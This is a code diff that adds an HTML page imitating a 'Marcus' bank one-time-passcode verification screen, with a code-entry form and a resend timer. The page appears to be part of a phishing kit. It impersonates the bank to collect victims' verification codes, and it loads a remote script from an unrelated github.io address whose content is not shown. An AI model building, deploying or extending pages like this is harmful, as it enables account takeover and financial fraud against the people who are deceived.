@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Enter Code Marcus</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    *{
+      box-sizing:border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body{
+      margin:0;
+      background:#fff;
+      color:#222;
+    }
+
+    .header{
+      padding:18px;
+      border-bottom:1px solid #ddd;
+      font-weight:700;
+      font-size:20px;
+    }
+
+    .container{
+      padding:22px;
+      max-width:420px;
+      margin:auto;
+      text-align:center;
+    }
+
+    h1{
+      margin-bottom:10px;
+      font-size:24px;
+    }
+
+    p{
+      color:#555;
+      margin-bottom:26px;
+    }
+
+    .otp-box{
+      display:flex;
+      justify-content:space-between;
+      gap:8px;
+      margin-bottom:26px;
+    }
+
+    .otp-box input{
+      width:358px;
+      height:52px;
+      text-align:center;
+      font-size:22px;
+      border-radius:10px;
+      border:1px solid #ccc;
+    }
+
+    .btn{
+      width:100%;
+      padding:14px;
+      background:#1e73be;
+      color:white;
+      border:none;
+      border-radius:10px;
+      font-size:16px;
+      font-weight:600;
+      cursor:pointer;
+    }
+
+    .resend{
+      margin-top:20px;
+      color:#1e73be;
+      font-weight:600;
+      cursor:pointer;
+      display:inline-block;
+    }
+  </style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+  <div class="header">Marcus</div>
+
+  <div class="container">
+    <h1>Enter verification code</h1>
+    <p>We sent a 6-digit code to your selected delivery method.</p>
+<form>
+    <div class="otp-box">
+      <input maxlength="16" required name="Otp code">
+    </div>
+
+    <button class="btn">Verify</button>
+
+  <div class="resend" id="resendBtn">Resend code (30s)</div>
+  </div>
+</form>
+<script>
+  const resendBtn = document.getElementById("resendBtn");
+
+  let baseTime = 30;   // initial 30 seconds
+  let currentTime = baseTime;
+  let timerActive = true;
+
+  function startCountdown() {
+    resendBtn.style.pointerEvents = "none";
+    resendBtn.style.opacity = "0.5";
+
+    const interval = setInterval(() => {
+      resendBtn.textContent = `Resend code (${currentTime}s)`;
+      currentTime--;
+
+      if (currentTime < 0) {
+        clearInterval(interval);
+
+        resendBtn.textContent = "Resend code";
+        resendBtn.style.pointerEvents = "auto";
+        resendBtn.style.opacity = "1";
+        timerActive = false;
+      }
+    }, 1000);
+  }
+
+  // First automatic countdown on page load
+  startCountdown();
+
+  resendBtn.onclick = () => {
+    if (timerActive) return;
+
+    // Increase time by 30 seconds every resend
+    baseTime += 30;
+    currentTime = baseTime;
+    timerActive = true;
+
+    startCountdown();
+  };
+</script>
+</body>
+</html>
